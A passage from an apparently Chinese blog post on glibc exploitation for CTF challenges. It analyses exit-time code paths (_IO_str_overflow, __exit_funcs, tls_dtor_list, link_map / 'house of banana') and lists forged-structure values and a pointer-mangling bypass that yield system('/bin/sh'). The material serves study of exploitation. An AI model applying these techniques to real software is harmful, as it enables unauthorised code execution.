class="line">        ... <span class="comment">// need to be here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即<code>fake_fp-&gt;_IO_write_ptr - fake_fp-&gt;_IO_write_base &gt; fake_fp-&gt;_IO_buf_end - fake_fp-&gt;_IO_buf_base</code>，以及<code>fake_fp-&gt;_flags &amp; _IO_USER_BUF == 0</code>。</p><p>做个小小的总结，伪造的_IO_FILE只要满足：</p><ul><li><code>_flags &amp; _IO_USER_BUF == 0</code></li><li><code>_mode &lt;= 0</code></li><li><code>_IO_write_ptr - _IO_write_base &gt; _IO_buf_end - _IO_buf_base</code></li><li><code>vtable = _IO_str_jumps</code> （或者其他含有<code>_IO_str_overflow</code>指针的vtable）</li></ul><p>就可以愉快地调用<code>malloc</code>，<code>memcpy</code>和<code>free</code>了。</p><h2 id="exit-funcs"><a href="#exit-funcs" class="headerlink" title="__exit_funcs"></a>__exit_funcs</h2><p>上面在分析<code>exit</code>的时候，跳过了<code>__exit_funcs</code>的逻辑，实际上，<code>__exit_funcs</code>作为libc中的全局变量，是可以被修改的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>首先，关注一下<code>__exit_funcs</code>里，存的到底是个什么东西，实际上，它存放了一个<code>exit_function_list</code>结构体指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* `flavour' should be of type of the `enum' above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int'.  */</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> flavor;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">void</span> (*at) (<span class="keyword">void</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="keyword">void</span> (*fn) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">            <span class="keyword">void</span> *arg;</span><br><span class="line">        &#125; on;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="keyword">void</span> (*fn) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line">            <span class="keyword">void</span> *arg;</span><br><span class="line">            <span class="keyword">void</span> *dso_handle;</span><br><span class="line">        &#125; cxa;</span><br><span class="line">    &#125; func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，毋庸置疑，<code>next</code>成员组织了一条单向链表，它遍历的行为，就是在每轮循环后，用<code>next</code>覆盖<code>__exit_funcs</code>：（不过不是很重要）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*listp = cur-&gt;next;     <span class="comment">// listp = &amp;__exit_funcs</span></span><br></pre></td></tr></table></figure><p>关键在于，<code>idx</code>指明了<code>exit_function</code>的数量，且会从后往前遍历<code>exit_functions</code>数组，并根据其中的<code>flavor</code>成员进行相应的函数调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">    <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">    <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free: <span class="comment">// 0</span></span><br><span class="line">    <span class="keyword">case</span> ef_us:   <span class="comment">// 1</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:   <span class="comment">// 2</span></span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      onfct (status, f-&gt;func.on.arg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:   <span class="comment">// 3</span></span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      atfct ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:  <span class="comment">// 4</span></span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">     we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难想到，如果我们劫持<code>__exit_funcs</code>，设置其<code>idx = 1</code>，然后相应地设置<code>fns[0]</code>，就可以完成任意函数调用了，如果关注一下<code>case ef_cxa</code>的情况，甚至函数的第一个参数都是可控的。</p><p>然而事实却并非那么简单，注意到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pointer mangling support.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="comment">/* We cannot use the thread descriptor because in ld.so we use setjmp</span></span><br><span class="line"><span class="comment">   earlier than the descriptor is initialized.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_MANGLE(reg)xor __pointer_chk_guard_local(%rip), reg;    \</span></span><br><span class="line">rol $<span class="number">2</span>*LP_SIZE+<span class="number">1</span>, reg</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(reg)ror $2*LP_SIZE+1, reg;     \</span></span><br><span class="line"><span class="keyword">xor</span> __pointer_chk_guard_local(%rip), reg</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_MANGLE(reg)asm (<span class="meta-string">"xor __pointer_chk_guard_local(%%rip), %0\n"</span> \</span></span><br><span class="line">     <span class="string">"rol $2*"</span> LP_SIZE <span class="string">"+1, %0"</span>  \</span><br><span class="line">     : <span class="string">"=r"</span> (reg) : <span class="string">"0"</span> (reg))</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(reg)asm (<span class="meta-string">"ror $2*"</span> LP_SIZE <span class="meta-string">"+1, %0\n"</span>  \</span></span><br><span class="line">     <span class="string">"xor __pointer_chk_guard_local(%%rip), %0"</span>   \</span><br><span class="line">     : <span class="string">"=r"</span> (reg) : <span class="string">"0"</span> (reg))</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_MANGLE(reg)xor %fs:POINTER_GUARD, reg;      \</span></span><br><span class="line">rol $<span class="number">2</span>*LP_SIZE+<span class="number">1</span>, reg</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(reg)ror $2*LP_SIZE+1, reg;      \</span></span><br><span class="line"><span class="keyword">xor</span> %fs:POINTER_GUARD, reg</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_MANGLE(var)asm (<span class="meta-string">"xor %%fs:%c2, %0\n"</span>      \</span></span><br><span class="line">     <span class="string">"rol $2*"</span> LP_SIZE <span class="string">"+1, %0"</span>      \</span><br><span class="line">     : <span class="string">"=r"</span> (var)      \</span><br><span class="line">     : <span class="string">"0"</span> (var),      \</span><br><span class="line">       <span class="string">"i"</span> (offsetof (<span class="keyword">tcbhead_t</span>,      \</span><br><span class="line">      pointer_guard)))</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(var)asm (<span class="meta-string">"ror $2*"</span> LP_SIZE <span class="meta-string">"+1, %0\n"</span>      \</span></span><br><span class="line">     <span class="string">"xor %%fs:%c2, %0"</span>      \</span><br><span class="line">     : <span class="string">"=r"</span> (var)      \</span><br><span class="line">     : <span class="string">"0"</span> (var),      \</span><br><span class="line">       <span class="string">"i"</span> (offsetof (<span class="keyword">tcbhead_t</span>,      \</span><br><span class="line">      pointer_guard)))</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>简单来说，这里存在一个指针加解密的操作，即<code>f-&gt;func.cxa.fn</code>是被加密过的，如果直接写入目标地址，那么显然会SSEGV。</p><p>但是考虑得更深一步的话，会发现，这个加密操作<code>ror(ptr, 17) ^ fs:[0x30]</code>中，<code>fs:[0x30]</code>位于TLS处，是完全可写的位置，如果将其修改为一个已知值，那么指针加密的问题就迎刃而解了。</p><blockquote><p>如何定位到TLS的位置，实际上本地环境和远程环境往往存在差异，但是空间并不大，爆破是完全可取的</p><p>至于如何在本地定位到这个<code>fs:[0x30]</code>，目前我的做法是：</p><ul><li>注意到在ld中执行相应逻辑时，PTR_DEMANGEL的宏定义中，取得不是<code>fs:[0x30]</code>，而是<code>__pointer_chk_guard_local</code></li><li>因此，完全可以先读到<code>__pointer_chk_guard_local</code>，然后在内存中搜索即可，因为两者值是完全一致的</li></ul></blockquote><p>解决这个问题之后，那么只要设置好加密指针和函数，目的就已经达到了。</p><p>同样做个小小的总结，伪造的<code>__exit_funcs</code>可以满足：</p><ul><li><code>idx = 1</code></li><li><code>fns[0].flavor = ef_cxa</code></li><li><code>fns[1].func.cxa.fn = rol(fs:[0x30] ^ system, 17)</code></li><li><code>fns[1].func.cxa.arg = &amp;str_bin_sh</code></li></ul><p>就可以在exit的时候，调用<code>system(&quot;/bin/sh&quot;)</code>了；当然，如果要orw的话，做相应的修改即可，这点与打<code>__free_hook</code>应该没什么区别。</p><h2 id="tls-dtor-list"><a href="#tls-dtor-list" class="headerlink" title="tls_dtor_list"></a>tls_dtor_list</h2><p>不小心忽略了<code>__run_exit_handlers</code>中，最开始的一部分代码了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br></pre></td></tr></table></figure><p>首先从传参的角度，<code>run_dtors = true</code>，必然进入到<code>__call_tls_dtors</code>中；且从注释里面可以看到，这其实是要对TLS进行析构。</p><p>深入分析<code>__call_tls_dtors</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call the destructors.  This is called either when a thread returns from the</span></span><br><span class="line"><span class="comment">   initial function or when the process exits via the exit function.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__call_tls_dtors (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> = <span class="title">tls_dtor_list</span>;</span></span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment"> potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment"> l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p>简单明了，<code>tls_dtor_list</code>存放在TLS上，且处于可写的地址处，如果能够劫持<code>tls_dtor_list</code>，就可以任意函数调用了，且第一个参数同样可控：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="keyword">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样的问题是，该指针仍然是被加密的，如果能够修改<code>fs:[0x30]</code>的值，同样可以完成bypass。</p><h2 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a>link_map</h2><p>来自安全客的一篇<a href="https://www.anquanke.com/post/id/222948" target="_blank" rel="noopener">house of banana</a>，利用核心在于劫持<code>_rtld_global</code>的<code>link_map</code>结构，同样是因为这篇house of banana虽然给了poc，但是原理还是得弄清楚，虽然可能不常用，但是说不定什么时候就派上用场了。</p><p><code>_rtld_global</code>作为一个ld中的全局变量，它是一个<code>rtld_global</code>结构体，但如果要从结构体入手分析，则过于复杂，因此选择从被引函数分析入手。</p><p>那么问题在于，<code>_rtld_global</code>在哪里被调用了，实际上，它是通过<code>exit</code>中，解析<code>__exit_funcs</code>后调用的<code>_dl_fini</code>中被调用的，如果直接在<code>_dl_fini</code>中下断点，不难根据调用栈定位到。</p><p>那么，分析一下<code>_dl_fini</code>：（因为过长，所以选择关键部分）</p><ul><li><p>首先第一部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line">#ifdef SHARED</span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">#endif</span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">     copy the pointers in.  */</span></span><br><span class="line">  struct link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>通常情况下，这里<code>GL(dl_nns)</code>即<code>_rtld_global-&gt;_dl_nns = 1</code>，从而引出了我们的目标<code>GL(dl_ns)[ns]._ns_loaded</code>，即<code>_rtld_global-&gt;_dl_ns[0]-&gt;_ns_loaded</code>这个<code>link_map</code>结构体指针；而这里的逻辑，其实就是通过<code>link_map-&gt;l_next</code>遍历单向链表，然后依次放入到<code>maps</code>中。</p></li><li><p>关键在于第二部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DT_INIT_ARRAYSZ27<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> = <span class="title">maps</span>[<span class="title">i</span>];</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">     <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    _dl_debug_printf (<span class="string">"\ncalling fini: %s [%lu]\n\n"</span>,</span><br><span class="line">              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">              ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">   (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">      <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>简而言之，这段逻辑在通过<code>l-&gt;l_info</code>数组中存放的各个setction的位置，定位<code>fini_array</code>数组，并且进行依次调用。</p></li></ul><p>结合<code>struct link_map</code>结构体数据结构，需要伪造以下结构体成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_rtld_global-&gt;_dl_ns[<span class="number">0</span>]-&gt;_ns_loaded: (link <span class="built_in">map</span>) </span><br><span class="line">offset           member</span><br><span class="line"><span class="number">0x0</span>              l_addr         (<span class="built_in">point</span> to program base by <span class="keyword">default</span>)</span><br><span class="line"><span class="number">0x10</span>             l_next         (<span class="built_in">point</span> to next link <span class="built_in">map</span>, the length of the linked <span class="built_in">list</span> should be <span class="number">4</span>)</span><br><span class="line"><span class="number">0x20</span>  l_real(<span class="built_in">point</span> to itself)</span><br><span class="line"><span class="number">0x110</span>            l_info[<span class="number">0x1A</span>]   (</span><br><span class="line">                                    <span class="built_in">point</span> to fini_array Elf64_Dyn structure:</span><br><span class="line">                                    <span class="keyword">typedef</span> struct</span><br><span class="line">                                    &#123;</span><br><span class="line">                                    Elf64_Sxwordd_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">                                    <span class="keyword">union</span></span><br><span class="line">                                        &#123;</span><br><span class="line">                                            Elf64_Xword d_val;<span class="comment">/* Integer value */</span>             </span><br><span class="line">                                            Elf64_Addr d_ptr;    <span class="comment">/* Address value */</span>       </span><br><span class="line">                                        <span class="comment">// l_info[0x1A]-&gt;d_un.d_ptr + l_addr = &amp;fini_array</span></span><br><span class="line">                                        &#125; d_un;</span><br><span class="line">                                    &#125; Elf64_Dyn;)</span><br><span class="line">                                )</span><br><span class="line"><span class="number">0x120</span>            l_info[<span class="number">0x1C</span>]   (<span class="built_in">point</span> to fini_array_size Elf64_Dyn structure)         